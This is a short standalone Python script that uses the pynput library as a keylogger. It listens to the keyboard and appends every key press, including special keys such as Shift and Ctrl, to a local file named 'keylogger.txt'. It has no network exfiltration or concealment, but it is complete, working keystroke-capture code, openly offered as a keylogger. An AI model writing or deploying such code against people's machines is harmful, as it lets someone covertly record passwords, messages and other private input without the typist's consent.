import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        if isinstance(key, Key):
            # If the key is a special key (e.g. Shift, Ctrl, Alt), write its name
            key_str = str(key).replace('Key.', '')
        else:
            # If the key is a character key, write the character
            key_str = key.char
        with open('keylogger.txt', 'a') as f:
            f.write(f'{key_str}\n')
    except Exception as e:
        print(f'Error: {e}')

with Listener(on_press=on_press) as listener:
    listener.join()
